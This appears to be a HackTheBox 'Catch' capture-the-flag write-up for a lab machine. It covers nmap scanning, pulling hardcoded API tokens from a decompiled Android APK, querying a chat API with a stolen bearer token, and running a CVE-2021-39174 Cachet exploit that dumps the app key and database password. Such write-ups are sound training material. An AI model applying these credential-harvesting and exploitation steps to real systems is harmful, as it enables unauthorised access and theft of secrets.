---
title:  "HTB - Catch Writeup"
tags:
  - cs/hacking
  - cs/hacking/htb
  - cs/hacking/writeup
programming-languages:
created: 2022-07-24
---
## HTB - Catch
Catching an API key out of an Android APK file.

### Nmap
```bash
~/htb/catch > sudo nmap -sC -sV -oA nmap/catch 10.10.11.150
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-24 10:06 BST
Nmap scan report for 10.10.11.150
Host is up (0.044s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Catch Global Systems
|_http-server-header: Apache/2.4.41 (Ubuntu)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: i_like_gitea=e34b4c6276830901; Path=/; HttpOnly
|     Set-Cookie: _csrf=OXlC-5WFWNa3tjEGr1XYnx_tsI46MTY1ODY1MzYwMTgxMDQ5OTM0OQ; Path=/; Expires=Mon, 25 Jul 2022 09:06:41 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Sun, 24 Jul 2022 09:06:41 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title> Catch Repositories </title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiQ2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcyIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Set-Cookie: i_like_gitea=63e4dc2088570d9a; Path=/; HttpOnly
|     Set-Cookie: _csrf=QjeuksO6F_cYjyIciGl8BDMjLhE6MTY1ODY1MzYwNzA1MjcyNjIxMg; Path=/; Expires=Mon, 25 Jul 2022 09:06:47 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Sun, 24 Jul 2022 09:06:47 GMT
|_    Content-Length: 0
5000/tcp open  upnp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, SMBProgNeg, ZendJavaBridge: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 302 Found
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Content-Security-Policy: 
|     X-Content-Security-Policy: 
|     X-WebKit-CSP: 
|     X-UA-Compatible: IE=Edge,chrome=1
|     Location: /login
|     Vary: Accept, Accept-Encoding
|     Content-Type: text/plain; charset=utf-8
|     Content-Length: 28
|     Set-Cookie: connect.sid=s%3A2JdZA0jQc1Y4uvsSVVgGOX289Tfj8wMJ.8t1YnEkkHpQsuQ0UbYj%2Fg6KpKGeJujjWsI3JXo6vG7k; Path=/; HttpOnly
|     Date: Sun, 24 Jul 2022 09:06:46 GMT
|     Connection: close
|     Found. Redirecting to /login
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Content-Security-Policy: 
|     X-Content-Security-Policy: 
|     X-WebKit-CSP: 
|     X-UA-Compatible: IE=Edge,chrome=1
|     Allow: GET,HEAD
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 8
|     ETag: W/"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg"
|     Set-Cookie: connect.sid=s%3ANY_CBms2Ve1RlrbZje_fpCX0UI45OftF.9uB0CxsDxyQOG9lrOrPM%2BqA0qECc2CbOWXvPGSKjVAw; Path=/; HttpOnly
|     Vary: Accept-Encoding
|     Date: Sun, 24 Jul 2022 09:06:47 GMT
|     Connection: close
|_    GET,HEAD
8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Catch Global Systems
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

We look at the cookies in `8000`:

```
GET / HTTP/1.1
Host: 10.10.11.150:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: _csrf=gXmZ_9G_qsC8-pA87VTXGSPkWWY6MTY1ODY1Mzk3Mjk2OTQzNDI5Mg; XSRF-TOKEN=eyJpdiI6Im8wUnpxaHNzc21jZUNuYkoyUUlEaUE9PSIsInZhbHVlIjoiejVKekhXWXJJMFdSR2ZudVNwVllFMlVkVW5SeFwvSGM3MVRXNWI0UlNWdVJ6b3JKWkxGMlRIdWJybWdJT0k1WFgiLCJtYWMiOiI0NDgzYmJjMTc1NzU4MTg3MTA5YjU5ZDlhMjhhZWRiNTQyNDNlNzQ1OTU3MzczZjdmMTAxNTg1OWQyNTc4YjdjIn0%3D; laravel_session=eyJpdiI6IjFidXc0UTE0REhnMGZOSjVHSGZOTWc9PSIsInZhbHVlIjoiQmRBbDNPNlE2dFwvbkQzOFwvc2IxdURiVkF4ZnRcLzE2Z0V4VTBHMXNOUHZ6WXlGdUhpVzlLUTBrV0ZNQUh5VWtjRiIsIm1hYyI6ImU1NDdmMTJkYzc1MmFkN2FlOGQyNGEwYmJhODhiMDBlMDM2Yzg1YTNkMmU1MDQ4ZjFiNDhlZmFmM2JmMjc5OWYifQ%3D%3D
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

We can download the file from the main website, which is an APK. We then open it with `jadx-gui`. We can look in `com/example.acatch/MainActivity`. It loads `https://status.catch.htb/`, so we look into it. First make sure to add it to the host file (`/etc/hosts`). Also a good idea to look through the de-compiled **apk** for anything password/token related. There is a reference to `gitea_token` and `lets chat` in `strings.xml`:

```xml
<string name="gitea_token">b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0</string>

<string name="lets_chat_token">NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==</string>
```

The `lets chat` token is **base64** so we:

```bash
~/htb/catch > echo -n NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ== | base64 -d
61b86aead984e2451036eb16:d588468ff8bae446379a57fa2b4e63a2368224336b5949c5%
```

We can do:

```bash
[~/htb/catch > curl -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" 10.10.11.150:5000/rooms
[{"id":"61b86b28d984e2451036eb17","slug":"status","name":"Status","description":"Cachet Updates and Maintenance","lastActive":"2021-12-14T10:34:20.749Z","created":"2021-12-14T10:00:08.384Z","owner":"61b86aead984e2451036eb16","private":false,"hasPassword":false,"participants":[]},{"id":"61b8708efe190b466d476bfb","slug":"android_dev","name":"Android Development","description":"Android App Updates, Issues & More","lastActive":"2021-12-14T10:24:21.145Z","created":"2021-12-14T10:23:10.474Z","owner":"61b86aead984e2451036eb16","private":false,"hasPassword":false,"participants":[]},{"id":"61b86b3fd984e2451036eb18","slug":"employees","name":"Employees","description":"New Joinees, Org updates","lastActive":"2021-12-14T10:18:04.710Z","created":"2021-12-14T10:00:31.043Z","owner":"61b86aead984e2451036eb16","private":false,"hasPassword":false,"participants":[]}]](<~/htb/catch %3E curl -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" 10.10.11.150:5000/rooms | jq .                                                          8s
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   860  100   860    0     0   4820      0 --:--:-- --:--:-- --:--:--  4804
[
  {
    "id": "61b86b28d984e2451036eb17",
    "slug": "status",
    "name": "Status",
    "description": "Cachet Updates and Maintenance",
    "lastActive": "2021-12-14T10:34:20.749Z",
    "created": "2021-12-14T10:00:08.384Z",
    "owner": "61b86aead984e2451036eb16",
    "private": false,
    "hasPassword": false,
    "participants": []
  },
  {
    "id": "61b8708efe190b466d476bfb",
    "slug": "android_dev",
    "name": "Android Development",
    "description": "Android App Updates, Issues & More",
    "lastActive": "2021-12-14T10:24:21.145Z",
    "created": "2021-12-14T10:23:10.474Z",
    "owner": "61b86aead984e2451036eb16",
    "private": false,
    "hasPassword": false,
    "participants": []
  },
  {
    "id": "61b86b3fd984e2451036eb18",
    "slug": "employees",
    "name": "Employees",
    "description": "New Joinees, Org updates",
    "lastActive": "2021-12-14T10:18:04.710Z",
    "created": "2021-12-14T10:00:31.043Z",
    "owner": "61b86aead984e2451036eb16",
    "private": false,
    "hasPassword": false,
    "participants": []
  }
]>)
```

We can look into the employers ID and look at messages:

```bash
~/htb/catch > curl -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" 10.10.11.150:5000/rooms/61b86b3fd984e2451036eb18/messages | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1065  100  1065    0     0   3025      0 --:--:-- --:--:-- --:--:--  3034
[
  {
    "id": "61b86f5cfe190b466d476bf7",
    "text": "Thanks @admin ",
    "posted": "2021-12-14T10:18:04.710Z",
    "owner": "61b86f15fe190b466d476bf5",
    "room": "61b86b3fd984e2451036eb18"
  },
  {
    "id": "61b86ef2fe190b466d476bf4",
    "text": "Please welcome our new IT Admin - Lucas, a crucial role that will help Catch’s revenue and will contribute to the overall profitability of the company!",
    "posted": "2021-12-14T10:16:18.187Z",
    "owner": "61b86aead984e2451036eb16",
    "room": "61b86b3fd984e2451036eb18"
  },
  {
    "id": "61b86e5dfe190b466d476bf3",
    "text": "Thanks John! Glad to be part of the Catch ",
    "posted": "2021-12-14T10:13:49.568Z",
    "owner": "61b86e40fe190b466d476bf2",
    "room": "61b86b3fd984e2451036eb18"
  },
  {
    "id": "61b86e12fe190b466d476bf1",
    "text": "Welcome Will!",
    "posted": "2021-12-14T10:12:34.388Z",
    "owner": "61b86dbdfe190b466d476bf0",
    "room": "61b86b3fd984e2451036eb18"
  },
  {
    "id": "61b86d5ffe190b466d476bef",
    "text": "Join me in welcoming our new employee Will Robinson who's working as iOS Developer with John Team",
    "posted": "2021-12-14T10:09:35.597Z",
    "owner": "61b86aead984e2451036eb16",
    "room": "61b86b3fd984e2451036eb18"
  }
]
```

So **Lucas** is admin. Found some credentials in `status/messages`:

```bash
{
    "id": "61b8702dfe190b466d476bfa",
    "text": "Here are the credentials `john :  E}V!mywu_69T4C}W`",
    "posted": "2021-12-14T10:21:33.859Z",
    "owner": "61b86f15fe190b466d476bf5",
    "room": "61b86b28d984e2451036eb17"
  },
```

It works on Catchet!! `10.10.11.150:8000/auth/login`. We have version **2.4.0**. We can try **CVE-2021-39174**. Running it we get:

```bash
~/htb/catch > python3 exploit.py -n john -p 'E}V!mywu_69T4C}W' -u http://10.10.11.150:8000                                                                                                                                                11s
[+] Getting CSRF token
[+] CSRF token: 5yYafvynDhngG6M0URL46zNHv5JpDRoz8gEXgbvC
[+] Logging in as user 'john'
[+] Successfully logged in
[+] Getting current field values
[+] Sending payload
[+] Connection error. Retrying in 5s.
[+] Extracted the following values:
- APP_KEY		= base64:9mUxJeOqzwJdByidmxhbJaa74xh3ObD79OI6oG1KgyA=
- DB_DRIVER		= mysql
- DB_HOST		= localhost
- DB_DATABASE		= cachet
- DB_USERNAME		= will
- DB_PASSWORD		= s2#4Fg0_%3!
[+] Unsetting payload variable
[+] Exiting
```

${DB_USERNAME}